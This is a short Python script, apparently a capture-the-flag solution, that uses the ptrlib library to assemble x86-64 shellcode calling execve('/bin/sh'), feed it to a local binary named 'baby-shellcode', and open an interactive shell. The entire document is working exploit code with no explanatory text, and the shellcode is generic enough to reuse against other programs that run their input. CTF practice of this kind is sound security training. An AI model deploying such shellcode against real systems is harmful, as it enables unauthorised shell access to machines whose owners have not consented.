from ptrlib import *

file = "./baby-shellcode"
e = ELF(file)
sock = Process(file)
sock.debug = True

shellcode = nasm(f"""
    ; execve("/bin/sh", 0, 0)
    lea rdi, [rel binsh]
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
binsh:
    db "/bin/sh", 0
""", bits=64)

sock.sendline(shellcode)
sock.sh()
